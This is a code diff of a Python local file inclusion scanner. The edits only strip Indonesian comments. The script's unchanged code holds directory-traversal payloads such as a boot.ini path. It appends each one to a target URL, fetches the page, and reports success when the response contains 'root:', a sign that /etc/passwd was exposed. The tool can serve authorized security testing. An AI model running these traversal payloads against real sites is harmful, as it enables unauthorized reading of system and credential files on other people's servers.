@@ -192,7 +192,6 @@ payloads = [
 "../../../../../../../../../../../boot.ini#.html",
 ]
 
-# tampilkan argumen
 arg = ArgumentParser(description="Simple LFI (Local File Inclusion) vulnerability scanner")
 arg.add_argument("-u","--url",help="target url",required=True)
 
@@ -200,20 +199,20 @@ if len(argv) == 1:
 	arg.print_help()
 	arg.exit()
 
-# suruh user masukin url targetnya
+
 if len(argv) >= 1:
 	system("clear")
-	banner() # print banner
+	banner() 
 
 	for payload in payloads:
 		url = argv[2]
 		gabung = url+payload
 		ex = get(gabung)
 
-		# memeriksa jika ada tulisan root didalam teks
+		
 		if "root:" in ex.text:
 			print(Fore.LIGHTGREEN_EX+"found"+Fore.RESET,url+payload)
 
-		# jika tidak ada
+		
 		else:
 			print(Fore.LIGHTRED_EX+"not found"+Fore.RESET,url+payload)
